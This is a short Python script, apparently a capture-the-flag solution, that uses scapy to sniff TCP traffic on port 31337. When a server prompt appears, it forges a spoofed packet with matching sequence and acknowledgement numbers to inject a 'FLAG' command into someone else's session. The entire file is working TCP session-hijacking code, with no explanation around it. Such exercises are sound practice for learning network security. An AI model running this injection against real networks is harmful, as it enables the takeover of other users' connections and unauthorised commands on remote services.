from scapy.all import *

def prn(packet):
    if TCP not in packet:
        return
    if not 31337 in (packet[TCP].dport, packet[TCP].sport):
        return
    print(packet)
    if Raw in packet:
        data= packet[Raw].load.decode()
        print("    " + repr(data))
        if data == 'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n':
            response_packet = (
                Ether(src=packet[Ether].dst, dst=packet[Ether].src)/
                IP(src=packet[IP].dst, dst=packet[IP].src)/
                TCP(sport=packet[TCP].dport, dport=packet[TCP].sport,
                    seq=packet[TCP].ack, ack=packet[TCP].seq + len(data), flags="PA")/
                b"FLAG\n"
            )
            sendp(response_packet, iface="eth0")

sniff(prn=prn, iface="eth0")
